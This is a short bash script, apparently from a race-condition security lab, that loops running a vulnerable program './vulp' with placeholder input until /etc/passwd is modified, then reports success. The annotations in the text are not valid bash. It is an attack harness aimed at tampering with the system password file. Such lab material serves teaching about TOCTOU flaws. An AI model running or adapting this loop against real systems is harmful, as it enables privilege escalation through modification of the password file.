#!/bin/bash
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ] ➙Check if /etc/passwd is modified
do
echo "your input" | ./vulp ➙Run the vulnerable program
new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"
